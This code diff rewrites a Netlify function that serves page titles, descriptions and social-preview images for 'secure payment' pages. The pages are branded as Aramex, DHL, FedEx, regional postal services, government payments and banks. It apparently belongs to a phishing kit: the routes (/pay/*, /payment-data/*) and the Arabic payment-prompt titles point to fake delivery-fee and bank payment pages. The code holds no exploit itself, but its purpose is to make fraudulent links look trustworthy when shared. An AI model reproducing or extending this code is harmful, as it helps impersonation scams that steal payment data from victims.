@@ -1,6 +1,4 @@
-import { Context } from "https://edge.netlify.com";
-
-const companyMeta: Record<string, { title: string; description: string; image: string }> = {
+const companyMeta = {
   aramex: {
     title: "دفع آمن - أرامكس للشحن السريع 🚚",
     description: "خدمات شحن عالمية مع أرامكس - أكمل عملية الدفع بأمان تام للحصول على خدمات شحن سريعة وموثوقة في جميع أنحاء الخليج والعالم ✅",
@@ -108,98 +106,28 @@ const companyMeta: Record<string, { title: string; description: string; image: s
   }
 };
 
-export default async (request: Request, context: Context) => {
-  try {
-    const url = new URL(request.url);
-    
-    const acceptHeader = request.headers.get("accept") || "";
-    if (!acceptHeader.includes("text/html")) {
-      return context.next();
-    }
-
-    const response = await context.next();
-    const contentType = response.headers.get("content-type") || "";
-    
-    if (!contentType.includes("text/html")) {
-      return response;
-    }
-
-    let html = await response.text();
-
-    let companyParam = url.searchParams.get("company") || url.searchParams.get("service");
-    
-    if (!companyParam) {
-      const pathMatch = url.pathname.match(/\/(aramex|dhl|fedex|ups|smsa|zajil|naqel|saudipost|empost|qpost|kwpost|omanpost|bahpost|chalets|contracts|invoices|government_payment|health_links|local_payment|bank_pages)/i);
-      if (pathMatch) {
-        companyParam = pathMatch[1];
-      }
-    }
-    
-    companyParam = companyParam || "default";
-    const meta = companyMeta[companyParam.toLowerCase()] || companyMeta.default;
-    
-    const fullImageUrl = meta.image.startsWith('http') 
-      ? meta.image 
-      : `${url.origin}${meta.image}`;
-    const fullUrl = url.href;
-
-    console.log(`[Dynamic Meta] Processing: ${url.pathname}, company=${companyParam}, Image: ${fullImageUrl}`);
-
-    const metaUpdates = [
-      { pattern: /<title>[^<]*<\/title>/gi, replacement: `<title>${meta.title}</title>` },
-      { pattern: /<meta\s+name="description"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta name="description" content="${meta.description}"/>` },
-      { pattern: /<meta\s+property="og:title"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:title" content="${meta.title}"/>` },
-      { pattern: /<meta\s+property="og:description"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:description" content="${meta.description}"/>` },
-      { pattern: /<meta\s+property="og:image"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:image" content="${fullImageUrl}"/>` },
-      { pattern: /<meta\s+property="og:url"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:url" content="${fullUrl}"/>` },
-      { pattern: /<meta\s+property="og:image:secure_url"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:image:secure_url" content="${fullImageUrl}"/>` },
-      { pattern: /<meta\s+property="og:image:alt"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:image:alt" content="${meta.title}"/>` },
-      { pattern: /<meta\s+name="twitter:title"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta name="twitter:title" content="${meta.title}"/>` },
-      { pattern: /<meta\s+name="twitter:description"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta name="twitter:description" content="${meta.description}"/>` },
-      { pattern: /<meta\s+name="twitter:image"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta name="twitter:image" content="${fullImageUrl}"/>` },
-      { pattern: /<meta\s+name="twitter:image:alt"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta name="twitter:image:alt" content="${meta.title}"/>` },
-    ];
-
-    let modified = false;
-    for (const update of metaUpdates) {
-      const before = html;
-      html = html.replace(update.pattern, update.replacement);
-      if (html !== before) modified = true;
-    }
-
-    if (!html.includes('property="og:url"') && !html.includes("property='og:url'")) {
-      html = html.replace(
-        /<head>/i,
-        `<head>\n    <meta property="og:url" content="${fullUrl}"/>`
-      );
-      modified = true;
-    }
-
-    if (!html.includes('property="og:image:secure_url"') && !html.includes("property='og:image:secure_url'")) {
-      html = html.replace(
-        /<meta property="og:image"/i,
-        `<meta property="og:image:secure_url" content="${fullImageUrl}"/>\n    <meta property="og:image"`
-      );
-      modified = true;
-    }
-    
-    console.log(`[Dynamic Meta] Modified: ${modified}, Tags injected for ${companyParam}`);
-
-    return new Response(html, {
-      headers: {
-        "content-type": "text/html; charset=utf-8",
-        "cache-control": "no-cache, no-store, must-revalidate, max-age=0",
-        "pragma": "no-cache",
-        "expires": "0",
-        "x-dynamic-meta": companyParam
-      }
-    });
-  } catch (error) {
-    console.error('[Dynamic Meta] Error:', error);
-    return context.next();
-  }
-};
-
-export const config = {
-  path: ["/", "/r/*", "/pay/*", "/payment-data/*", "/recipient/*"],
+exports.handler = async (event, context) => {
+  const { company, service } = event.queryStringParameters || {};
+  
+  const companyKey = (company || service || 'default').toLowerCase();
+  const meta = companyMeta[companyKey] || companyMeta.default;
+  
+  const origin = event.headers.host 
+    ? `https://${event.headers.host}` 
+    : 'https://your-domain.netlify.app';
+  
+  return {
+    statusCode: 200,
+    headers: {
+      'Content-Type': 'application/json',
+      'Cache-Control': 'public, max-age=3600',
+    },
+    body: JSON.stringify({
+      title: meta.title,
+      description: meta.description,
+      image: `${origin}${meta.image}`,
+      imageSecure: `${origin}${meta.image}`,
+      url: origin
+    })
+  };
 };
